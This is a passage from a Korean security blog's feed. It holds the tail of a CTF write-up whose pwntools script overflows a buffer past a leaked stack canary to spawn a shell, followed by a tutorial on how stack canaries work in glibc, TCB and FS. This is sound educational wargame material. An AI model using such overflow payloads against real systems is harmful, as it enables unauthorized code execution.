&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Name Size : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;300&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# now constructing payload; 1) BOF 2) Canary 3) getting shell(NX bit enabled)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;dump2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ebp_dump&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;get_shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dump2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ebp_dump&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_shell&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# gdb.attach(p)
# raw_input(&quot;1&quot;)
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Name : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;그 결과, 플래그를 얻을 수 있었다. 플래그 인증샷은 스포가 되니 넣지 않을 것이다…&lt;/p&gt;
</description>
        <pubDate>Fri, 03 Feb 2023 00:00:00 +0900</pubDate>
        <link>http://localhost:4000/2023/02/03/system-hacking-step-6-ssp-001/</link>
        <guid isPermaLink="true">http://localhost:4000/2023/02/03/system-hacking-step-6-ssp-001/</guid>
      </item>
    
      <item>
        <title>System Hacking Step 6-1</title>
        <description>&lt;h1 id=&quot;0-스택-카나리란&quot;&gt;0. 스택 카나리란?&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;스택 버퍼 오버플로우를 방어하기 위한 기법으로, 스택 버퍼와 반환 주소 사이에 임의로 생성된 값을 삽입하여 함수의 에필로그에서 해당 값의 변조를 확인하는 보호 기법
카나리 값의 변조가 확인되면 프로세스는 강제로 종료된다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-카나리의-작동-원리&quot;&gt;1. 카나리의 작동 원리&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;11-카나리-비활성화-활성화-비교&quot;&gt;1.1. 카나리 비활성화-활성화 비교&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;스택 카나리를 비활성화하는 옵션은 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-fno-stack-protector&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;111-카나리-비활성화의-경우&quot;&gt;1.1.1. 카나리 비활성화의 경우&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;해당 옵션을 줘서 스택 카나리가 꺼진 프로그램을 실행해 스택 버퍼 오버플로우를 일으켜 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;SEGFAULT가 뜨면서 프로그램 작동이 멈춘다. 당연하다. 버퍼에게 할당된 범위를 넘어서는 길이의 입력값을 줬는데, 그 입력값이 RET addr를 오염시킬 정도의 길이였기 때문이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;112-카나리-활성화의-경우&quot;&gt;1.1.2. 카나리 활성화의 경우&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그렇다면 해당 옵션을 주지 않고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc -o&lt;/code&gt; 옵션만으로 빌드해 스택 버퍼 오버플로우를 시도해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;직전의 카나리가 비활성화된 경우와 비교했을 때, ‘stack smashing detected; terminated’, ‘Aborted’ 메시지가 뜨며 프로세스가 강제 종료된 것을 확인할 수 있다. 스택 카나리가 변조된 것이 탐지되어 시스템에서 강제로 프로세스를 종료한 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;12--어셈블리-비교-분석-프롤로그와-에필로그의-차이&quot;&gt;1.2.  어셈블리 비교-분석; 프롤로그와 에필로그의 차이&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그렇다면 카나리를 켜고/끔에 따른 컴파일 결과는 어떻게 다를까. pwndbg를 통해 함수의 프롤로그와 에필로그를 비교해 보았다.&lt;/p&gt;

&lt;p&gt;카나리를 켠 버전의 디스어셈블 결과:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;카나리를 끈 버전의 디스어셈블 결과:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;둘을 비교한 결과, &lt;strong&gt;함수의 프롤로그와 에필로그에서 카나리를 켠 버전에 추가된 부분&lt;/strong&gt;이 눈에 띄었다.&lt;/p&gt;

&lt;p&gt;먼저 &lt;strong&gt;프롤로그&lt;/strong&gt;에 추가된 부분을 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;FS레지스터로부터 8byte 주소를 가져온다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;121-fs가-대체-뭐야&quot;&gt;1.2.1. FS가 대체 뭐야?&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;사실 나는 더 깊은 공부를 위해 이 커리큘럼을 따라가고 있는지라, 이 절의 내용은 스택 카나리를 저장하는 구조체의 역사와 그것이 참조되는 상황의 관행에 대해 다루고 있다. 또한 스택 카나리를 가져올 때의 참조는 관행적 상황이 아니라는 말 또한 덧붙이고 있다.&lt;/p&gt;

&lt;p&gt;따라서 스택 카나리에 대해서 Overview를 하고픈 사람들에게는 이 절을 읽는 것을 추천하지 않는다.&lt;/p&gt;

&lt;p&gt;64bit 프로세스에서는 FS:[0x28], 32bit 프로세스에서는 GS:[0x14]가 스택 카나리를 저장하고 있다.&lt;/p&gt;

&lt;p&gt;그런데 왜? 왜 그렇게 정해졌을까? 의문이 든다. 그 이유를 서술하기 위해 TCB와 PCB에 대해 약간의 설명을 한 후, TCB의 어디에 무엇이 스택 카나리를 저장하는지에 대해 설명하는 것이 좋을 듯 하다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;먼저 &lt;strong&gt;PCB가 나온 배경&lt;/strong&gt;을 알아보고, &lt;strong&gt;PCB 안에 무엇이 왜 저장되는지&lt;/strong&gt;에 대해 알아보자.&lt;/p&gt;

&lt;p&gt;어떤 프로세스가 실행될 경우, OS는 Time Sharing과 Space Sharing을 모두 적용한 상위 개념인 &lt;strong&gt;프로세스 스케줄링(Process Scheduling)&lt;/strong&gt;을 수행하게 된다. 이는 Multiprogramming을 제공하는 OS가 가진 하드웨어 리소스의 제한 때문에 개발이 시작된 방법이면서, 이후 OS 내부에서 동일 자원에 접근하는 프로세스들이 동시에 실행될 경우 발생할 수 있는 Race Condition(Critical Section의 침해), 혹은 Deadlock(Critical Section을 여러 프로세스가 동시에 요구할 때 발생하는 교착상태)을 막기 위해 더욱 발전한 방법이다.&lt;/p&gt;

&lt;p&gt;이때, Time Sharing의 특성으로 인해 특정 &lt;strong&gt;프로그램 A를 일정 시간(Burst Time) 동안 수행하다가 중단하고, CPU를 다른 프로그램 B에게 할당해야 하는 상황&lt;/strong&gt;이 생긴다. 이럴 경우:&lt;/p&gt;

&lt;p&gt;프로그램 A가 실행되던 상태를 저장하고 → 프로그램 B를 실행한 다음 → 다시 프로그램 A가 자원을 점유(Occupy)할 때 → 이전에 저장된 상태를 불러오는&lt;/p&gt;

&lt;p&gt;일련의 기능이 보장되어야 한다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이와 같이 프로세스와 쓰레드의 실행 컨텍스트를 저장하기 위해 윈도우는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EPROCESS(PCB)-KPROCESS(PEB)&lt;/code&gt;와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ETHREAD(TCB)-KTHREAD(TEB)&lt;/code&gt;라는 구조체를 사용하지만, 리눅스는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;task_struct(PCB)&lt;/code&gt; 와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;thread_info(TCB)&lt;/code&gt; 라는 구조체를 사용한다. 상호간에 기능 자체는 유사하지만, 윈도우의 리눅스 시스템의 구조가 너무나도 다르기 때문에 상호 대체재로 보지는 않는다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;PCB: Process Control Block&lt;/li&gt;
  &lt;li&gt;PEB: Process Environment Block&lt;/li&gt;
  &lt;li&gt;TCB: Thread Control Block&lt;/li&gt;
  &lt;li&gt;TEB: Thread Environment Block&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이제 &lt;strong&gt;프로세스에서 TCB가 refer 되는 상황&lt;/strong&gt;에 대해 알아보자. 프로세스는 실행 효율성을 올리기 위해 자원을 공유한 채로 작업을 다중화하는데, 이렇게 다중화된 작업 하나하나를 쓰레드라고 한다. 그리고 이런 쓰레드의 실행 컨텍스트를 저장하는 것을 TCB라 부른다. 보통은 프로세스에서 TCB에 접근하면 PCB의 주소를 알아내려고 하는 경우가 많다(윈도우의 경우 TEB에 접근해 PEB 구조체의 시작 주소를 알아낸다).&lt;/p&gt;

&lt;p&gt;그리고 &lt;strong&gt;리눅스의 TCB, 윈도우의 TEB를 가리키는 것으로 애초에 예약된 레지스터가 바로 FS 레지스터&lt;/strong&gt;이다.(정확히는 TLS, Thread Local Storage를 참조해 TCB/TEB에 있는 정보 중 필요한 것을 알아낸다) 다만, 리눅스는 32bit 프로그램에서는 GS, 64bit에서는 FS 레지스터가 TEB를 가리킨다.&lt;/p&gt;

&lt;p&gt;그럼 지금쯤 궁금증이 생길 것이다. 그래서, 저기 위의 스택 카나리를 가져오는 부분에서 FS[0x28]을 썼으니 TCB를 참조한 것일 텐데… 그럼 PCB에 접근하려고 한 건가?&lt;/p&gt;

&lt;p&gt;아니다.&lt;/p&gt;

&lt;p&gt;이제까지 열심히 설명해 놓고 이렇게 말하려니 멋쩍다. 하지만 이제껏 설명한 건 FS 레지스터가 무조건 가리키는 대상인 TCB에 대해 설명하다 보니, TCB를 참조하는 행위가 PCB의 시작 주소를 알아내려는 목적으로 관행적으로 사용된다는 요지의 배경 설명이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;강조해 말하자면, 스택 카나리를 찾아오려 FS를 이용해 TCB에 접근하는 행위는 PCB의 시작 주소를 알기 위해 TCB에 접근하는 행위가 아니다.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;깃허브의 glibc 레포지토리를 확인해 보면, &lt;a href=&quot;https://github.com/lattera/glibc/blob/a2f34833b1042d5d8eeb263b4cf4caaea138c4ad/nptl/sysdeps/i386/tls.h#L44&quot;&gt;TCB의 헤더 구조체&lt;/a&gt;를 확인할 수 있다. 그곳에 있는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack_guard&lt;/code&gt; 에 넣을 값을 생성하는 함수는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dl_setup_stack_chk_guard&lt;/code&gt; 로, &lt;a href=&quot;https://github.com/lattera/glibc/blob/a2f34833b1042d5d8eeb263b4cf4caaea138c4ad/sysdeps/generic/dl-osinfo.h#L23&quot;&gt;내부 매커니즘을 들여다보면&lt;/a&gt; 무조건 최하위 1byte가 NULL인 8byte 랜덤값이 생성됨을 알 수 있다. 즉, glibc를 이용해 컴파일된 모든 프로그램의 스택 카나리는 최하위 1byte가 NULL일 것이다.&lt;/p&gt;

&lt;p&gt;이렇게 생성된 스택 카나리 값은 TCB 구조체의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack_guard&lt;/code&gt; 항목에 저장된다.  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack_guard&lt;/code&gt; 변수의 위치가 32bit에서는 TCB의 베이스 기준 0x14의 오프셋을 가지고 있고, 64bit에서는 0x28의 오프셋을 가지고 있기 때문에 리눅스 시스템에서 돌아가는 &lt;strong&gt;ELF 확장자 파일의 64bit 버전에서는 FS:[0x28], 32bit 버전에서는 GS:[0x14]가 스택 카나리를 저장&lt;/strong&gt;하게 되는 것이다.&lt;/p&gt;

&lt;p&gt;(리눅스에서 fs+0x28만 스택 카나리를 저장하는 게 아니다. 컴파일된 비트 버전에 따라 TLS-내부에 TCB가 있다-를 전담하는 레지스터가 달라진다. gdb를 붙여 64비트 버전과 32비트 버전을 비교하면 쉽게 확인할 수 있다)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;122-gdb로-tcb의-스택-카나리-직접-확인하기&quot;&gt;1.2.2. gdb로 TCB의 스택 카나리 직접 확인하기&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;gdb에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info reg system&lt;/code&gt; 명령어를 통해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs_base&lt;/code&gt;와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gs_base&lt;/code&gt; 등의 시스템 레지스터 내역을 출력할 수 있다. 단순히 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info reg&lt;/code&gt; 를 통해 얻을 수 있는 레지스터들의 목록에는 표시되지 않는 레지스터들이 출력되니 중요한 명령어다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;현재 분석 대상 프로그램은 64비트로 컴파일되었으므로, fs 레지스터가 TCB 구조체를 refer할 것이다. 추측컨대, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs_base&lt;/code&gt;는 TCB 구조체의 시작 주소를 항상 가지고 있는 게 아닐까 싶다… &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs:[{hex}]&lt;/code&gt;일 땐 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs_base+hex&lt;/code&gt; 를 참조하는 것 같고.&lt;/p&gt;

&lt;p&gt;아무튼, TCB 구조체 시작 주소의 심볼이 fs_base인 것을 알았으니 이제 스택 카나리가 저장된 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FS:[0x28]&lt;/code&gt;에 접근해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;LSB가 NULL인 값이 나온다. 확실히 스택 카나리의 포맷에 맞는다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%207.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그리고 실제로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FS:[0x28]&lt;/code&gt;에 접근해 rax에 스택 카나리를 복사해 넣는 인스트럭션이 진행된 후의 rax 값과 동일하다. 즉, 스택 카나리 값에 성공적으로 접근했다!&lt;/p&gt;

&lt;p&gt;이제까지 프롤로그에 추가된 부분을 확인해 보았다. 다음으로 &lt;strong&gt;에필로그에 추가&lt;/strong&gt;된 부분을 분석해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%208.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt; 함수를 부른 이후 eax를 정리하는 과정 바로 다음에 추가된 4줄의 인스트럭션이다.&lt;/p&gt;

&lt;p&gt;함수의 에필로그에서 저장되었던 스택 카나리를 불러와 TCB에 저장된 원본 스택 카나리와 xor 한다. 즉, 같은지 확인한다. 그 결과 같다면, 즉 xor 결과가 0이기 때문에 ZF가 1으로 세팅된다면 함수를 정상적으로 종료하도록 한다&lt;sup id=&quot;fnref:je&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:je&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;. 그러나 만일 다르다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_stack_chk_fail&lt;/code&gt; 함수를 콜하게 된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;앞서 보았던 이 메시지를 출력하는 함수가 바로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_stack_chk_fail&lt;/code&gt; 함수이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-카나리-생성-과정-분석&quot;&gt;2. 카나리 생성 과정 분석&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;앞서 말한 분석 내용을 정리하자면 다음과 같다.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;카나리 값은 프로세스가 시작될 때 TLS(Thread Local Space) 내부에 존재하는 TCB(Thread Control Block)&lt;sup id=&quot;fnref:TCBTLS&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:TCBTLS&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;에 전역 변수로 저장되고, 컴파일러는 각 함수마다 프롤로그와 에필로그에서 이 값을 참조하도록 한다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;그렇다면, 정확히 카나리 값이 TCB에 저장되는 과정은 무엇일까? 이번 섹션에서는 그 과정을 하나씩 따라가 볼 것이다.&lt;/p&gt;

&lt;p&gt;카나리가 생성되어 저장되기까지의 과정을 큼직하게 나누어 보면 아래와 같다.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;프로세스 시작 → TLS 할당 → fs의 base값 지정 → 이후 fs를 이용한 TCB 접근 → 스택 카나리 저장&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;따라서, 먼저 fs의 base값이 어떻게 TLS와 연결되는지부터 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;21-fs와-tls의-연결과정-추적&quot;&gt;2.1. fs와 TLS의 연결과정 추적&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;사실 TLS가 할당되고, FS 레지스터의 값을 TLS 구조체와 연결되도록 변경하는 과정에 대해서는 이 &lt;a href=&quot;https://chao-tic.github.io/blog/2018/12/25/tls&quot;&gt;포스트&lt;/a&gt;가 정말 잘 서술해 놨다. 해당 포스트에서 이 섹션에 필요한 내용만 조금 발췌해 서술하면 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;x86-64 커널에서는 FS에 저장되는 주소가 MSR(Model Specific Register; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MSR_FS_BASE&lt;/code&gt;)에 의해 관리된다&lt;sup id=&quot;fnref:MSR&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:MSR&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;. 그리고 이러한 작용을 유저 프로세스가 커널에 요청할 수 있도록 시스템이 제공하는 system call이 바로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arch_prctl&lt;/code&gt; 이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arch_prctl&lt;/code&gt; 시스콜이 call 되는 시점에 프로세스를 중지하고 컨텍스트를 들여다 보면 FS 값이 어떻게 변화하는지, 지정된 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs_base&lt;/code&gt;는 무엇인지 알 수 있을 것이다.&lt;/p&gt;

&lt;p&gt;gdb에는 특정 행위가 발생했을 때 곧바로 프로세스 흐름을 중단하는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;catch&lt;/code&gt; 라는 명령어가 있다. 해당 명령어를 이용해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arch_prctl&lt;/code&gt; 시스콜이 발생하는 지점을 찾아보자. (이런 식으로 설정된 정지 지점은 breakpoint로 취급되기 때문에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info b&lt;/code&gt; 명령어로 리스트를 뽑아 볼 수 있다)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%209.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;이제 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt; 명령어로 프로그램을 실행해 보자. 플로우가 멈췄을 때의 콜스택은 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2010.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arch_prctl&lt;/code&gt; 이 요청되고 나서 해당 요청을 수행하기 위한 과정의 초입이다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&lt;/code&gt; 명령어로 쭉 따라가 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2011.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;init_tls&lt;/code&gt; 함수가 콜된 상황이다. 이 시점에서 해당 함수의 내부에 정의된 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__tls_init_tp&lt;/code&gt; 매크로가 실행된다.&lt;/p&gt;

&lt;p&gt;그렇다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__tls_init_tp&lt;/code&gt; 매크로는 어떤 기능을 할까?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;glibc.git / sysdeps / x86_64 / nptl / tls.h&lt;/code&gt;&lt;/strong&gt; 소스 코드에 정의된 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TLS_INIT_TP&lt;/code&gt; 를 보자.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;# define TLS_INIT_TP(thrdescr) \
  ({ void *_thrdescr = (thrdescr);                                              \
     tcbhead_t *_head = _thrdescr;                                              \
     int _result;                                                              \
                                                                              \
     _head-&amp;gt;tcb = _thrdescr;                                                      \
     &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* For now the thread descriptor is at the same address.  */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;              \
     _head-&amp;gt;self = _thrdescr;                                                      \
                                                                              \
     &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* It is a simple syscall to set the %fs value for the thread.  */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;              \
     asm volatile (&quot;syscall&quot;                                                      \
                   : &quot;=a&quot; (_result)                                              \
                   : &quot;0&quot; ((unsigned long int) __NR_arch_prctl),                      \
                     &quot;D&quot; ((unsigned long int) ARCH_SET_FS),                      \
                     &quot;S&quot; (_thrdescr)                                              \
                   : &quot;memory&quot;, &quot;cc&quot;, &quot;r11&quot;, &quot;cx&quot;);                              \
                                                                              \
    _result ? &quot;cannot set %fs base address for thread-local storage&quot; : 0;     \
  })
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;중간에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;asm volatile&lt;/code&gt; 로 인라인 어셈이 명시된 것이 보인다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;asm volatile&lt;/code&gt;은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__asm__ __volatile__(asms:output:input:clobber);&lt;/code&gt; 형식으로 사용되며, x86과 x86-64 환경에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;“D”&lt;/code&gt; 심볼이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;‘di’&lt;/code&gt; 레지스터를 의미한다. 자세한 내용은 &lt;a href=&quot;https://wiki.kldp.org/KoreanDoc/html/EmbeddedKernel-KLDP/app3.basic.html&quot;&gt;여기에서&lt;/a&gt;&lt;/p&gt;

